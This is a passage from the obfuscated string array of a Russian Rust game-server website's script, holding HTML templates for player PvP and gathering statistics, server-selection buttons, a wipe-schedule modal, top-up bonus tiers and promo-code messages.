stats-left\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-rank-icon\x22></div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22rank-number\x20text-glow\x22>', 'customModalWrapper', 'metal', 'Personaname', '_blank', 'scrap', 'Кука\x20установлена:', 'formattedTime', 'LeftLegHits', '</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22rank-level\x20text-glow-sub\x22>Белых\x20ягод</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-stats-image\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<img\x20src=\x22https://stats.ggrust.ru/images/stats/white.berry.png\x22\x20alt=\x22\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22profile-data\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22personal-stats-top\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-stats-left\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-rank-icon\x22></div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22rank-number\x20text-glow\x22>', 'timeframe', '</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20</section>\x0a\x0a\x0a\x0a\x20\x20\x20\x20<div\x20class=\x22form-control\x22>\x0a\x20\x20\x20\x20\x20\x20<div\x20class=\x22sections-container\x22\x20style=\x22display:\x20flex;\x20justify-content:\x20space-between;\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<section\x20class=\x22kills\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h1\x20class=\x22profile-data-header\x22>Убито</h1>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22profile-data-container\x22>\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22profile-data-section\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22profile-data\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22personal-stats-top\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-stats-left\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-rank-icon\x22></div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22rank-number\x20text-glow\x22>', '409152VujSfr', 'russianBtn\x20ban', '</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22rank-level\x20text-glow-sub\x22>Крокодилов</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-stats-image\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<img\x20src=\x22https://stats.ggrust.ru/images/stats/crocodile.png\x22\x20alt=\x22\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22profile-data-section\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22profile-data\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22personal-stats-top\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-stats-left\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-rank-icon\x22></div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22rank-number\x20text-glow\x22>', '</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22rank-level\x20text-glow-sub\x22>Куриц</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-stats-image\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<img\x20src=\x22https://stats.ggrust.ru/images/stats/chicken.png\x22\x20alt=\x22\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20</section>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<section\x20class=\x22hits\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-view\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h1\x20class=\x22hover-text\x22><i\x20class=\x22fa-solid\x20fa-circle-info\x22\x20style=\x22align-items:\x20center;\x22></i>\x20НАВЕДИТЕ\x20КУРСОР\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20ДЛЯ\x20ПОДСЧЕТА\x20ПОПАДАНИЙ\x20</h1><img\x20class=\x22player-model\x22\x20alt=\x22\x22\x20src=\x22https://rustaria.ru/img/player1.png\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22hits-container\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22hitcount\x20head\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h1\x20class=\x22hitcount-part\x22>Голова</h1>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<p\x20class=\x22hitcount-result\x22>', 'SteamID', '.small-steamid', '\x27,\x20\x27_blank\x27)\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-info-top\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-name\x22>', 'steamId', '&timeframe=', 'failSound', '.tableBtn', '\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<img\x20src=\x22https://rustaria.ru/getAvatar.php?steamid=', 'player', 'name', 'RightLegHits', 'response', '\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22bonus-amount\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<p\x20class=\x22bonus-line\x20bonus-line-0\x22>Бонусы\x20при\x20пополнении</p>\x0a<p\x20class=\x22bonus-line\x20bonus-line-1\x22>\x0a\x20\x20\x20\x20500\x20рублей\x20-\x20бонус\x2015%\x0a</p>\x0a<p\x20class=\x22bonus-line\x20bonus-line-2\x22>\x0a\x20\x20\x20\x201000\x20рублей\x20-\x20бонус\x2020%\x0a</p>\x0a<p\x20class=\x22bonus-line\x20bonus-line-3\x22>\x0a\x20\x20\x20\x202000\x20рублей\x20-\x20бонус\x2025%\x0a</p>\x0a<p\x20class=\x22bonus-line\x20bonus-line-4\x22>\x0a\x20\x20\x20\x205000\x20рублей\x20-\x20бонус\x2050%\x0a</p>\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<p\x20class=\x22bonus-line\x20bonus-line-5\x22>Любой\x20способ\x20оплаты</p>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20', 'text/html,\x20*/*;\x20q=0.01', 'PlayerPvpStats', '\x22\x20data-table=\x22GGRustRUSSIA1\x22>РОССИЙСКИЙ\x20x1</button>\x0a\x20\x20\x20\x20<button\x20id=\x22russian2_stats\x22\x20class=\x22statsBtnProfile\x22\x20data-steamid=\x22', 'servernamewipe', 'nextSibling', 'playtime', 'beforebegin', 'https://rustaria.ru/personalstats.php?steamid=', 'open', 'parentNode', 'appSettings', '&table=', '</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22rank-level\x20text-glow-sub\x22>Разбито\x20бочек</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-stats-image\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<img\x20src=\x22https://stats.ggrust.ru/images/stats/barrel.png\x22\x20alt=\x22\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22profile-data-section\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22profile-data\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22personal-stats-top\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-stats-left\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-rank-icon\x22></div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22rank-number\x20text-glow\x22>', 'leftfoot', 'TotalItemsCrafted', 'HeliKill', 'Discord\x20query\x202\x20not\x20ok\x20', '</span></p>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<p\x20class=\x22additional-text\x22>Статус:\x20<span\x20id=\x22playerStatus\x20', 'getElementById', 'piter_stats', ')</span></h1>\x0a\x20\x20\x20\x20\x20\x20<div\x20class=\x22profile-data-container-gather\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22profile-data-section-gather\x22>\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22profile-data-section\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22profile-data\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22personal-stats-top\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-stats-left\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-rank-icon\x22></div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22rank-number\x20text-glow\x22>', '</h2>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20data-v-22378e5b=\x22\x22\x20class=\x22profile-data-gather\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h1\x20data-v-22378e5b=\x22\x22\x20class=\x22profile-header\x22><i\x20data-v-22378e5b=\x22\x22\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20class=\x22fa-solid\x20fa-horse\x20profile-icon\x22></i>Металла\x20</h1>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h2\x20data-v-22378e5b=\x22\x22\x20class=\x22profile-result\x22>', 'Кука\x20не\x20найдена', '</h2>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20data-v-22378e5b=\x22\x22\x20class=\x22profile-data-section\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20data-v-22378e5b=\x22\x22\x20class=\x22profile-data\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h1\x20data-v-22378e5b=\x22\x22\x20class=\x22profile-header\x22><i\x20data-v-22378e5b=\x22\x22\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20class=\x22fa-solid\x20fa-user-doctor\x20profile-icon\x22></i>Ранен</h1>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h2\x20data-v-22378e5b=\x22\x22\x20class=\x22profile-result\x22>', '</p>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22hitcount\x20leftfoot\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h1\x20class=\x22hitcount-part\x22>Левая\x20нога</h1>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<p\x20class=\x22hitcount-result\x22>', 'getElementsByTagName', 'OnCustomWidgetSet\x20', '2344rvBDsi', '</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22rank-level\x20text-glow-sub\x22>Ткани</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-stats-image\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<img\x20src=\x22https://stats.ggrust.ru/images/stats/cloth.png\x22\x20alt=\x22\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22profile-data\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22personal-stats-top\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-stats-left\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-rank-icon\x22></div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22rank-number\x20text-glow\x22>', 'Boars', 'setAttribute', 'responseText', '\x0a\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22customModalOverflow\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22customModalPosition\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20role=\x22presentation\x22\x20onmousedown=\x22event.stopPropagation();\x22\x20class=\x22customModalContent\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22boxHeader\x22>Расписание\x20вайпов:</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22boxBody\x20wheenwipe\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22boxFooter\x22><button\x20onclick=\x22document.querySelector(\x27#wipeModal\x27).classList.remove(\x27active\x27);\x22\x20type=\x22button\x22\x20class=\x22btn\x20Button-module__btn\x20Button-module__gray\x22>Закрыть</button></div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20', 'add', '</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22rank-level\x20text-glow-sub\x22>Оленей</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-stats-image\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<img\x20src=\x22https://stats.ggrust.ru/images/stats/stag.webp\x22\x20alt=\x22\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22profile-data-section\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22profile-data\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22personal-stats-top\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-stats-left\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-rank-icon\x22></div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22rank-number\x20text-glow\x22>', 'background', 'top', 'body-no-scroll', 'dataset', 'expires', '</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22rank-level\x20text-glow-sub\x22>Танков</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-stats-image\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<img\x20src=\x22https://stats.ggrust.ru/images/stats/bradley.webp\x22\x20alt=\x22\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20</section>\x0a\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20<section\x20class=\x22gather\x22>\x0a\x20\x20\x20\x20\x20\x20<h1\x20class=\x22profile-data-header\x22>Статистика\x20фарма<span\x20style=\x22color:\x20green;\x22>(Очков\x20всего:\x20', 'getState', '</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22rank-level\x20text-glow-sub\x22>Красных\x20ягод</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-stats-image\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<img\x20src=\x22https://stats.ggrust.ru/images/stats/red.berry.png\x22\x20alt=\x22\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22profile-data\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22personal-stats-top\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-stats-left\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22player-rank-icon\x22></div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22rank-number\x20text-glow\x22>', '5232625CMpZPd', 'PlayerPvpStats_Kills', '\x22\x20data-table=\x22GGRustCLASSICA\x22>КЛАССИКА\x20х2</button>\x0a\x20\x20\x20\x20<button\x20id=\x22piter_stats\x22\x20class=\x22statsBtnProfile\x22\x20data-steamid=\x22', 'transform', '</p>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22hitcount\x20leftarm\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h1\x20class=\x22hitcount-part\x22>Левая\x20рука</h1>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<p\x20class=\x22hitcount-result\x22>', 'https://discord.com/invite/', 'Промокод\x20\x27', 'Промокод', 'serverInfo', '\x20в\x20сети', 'status', 'initState', 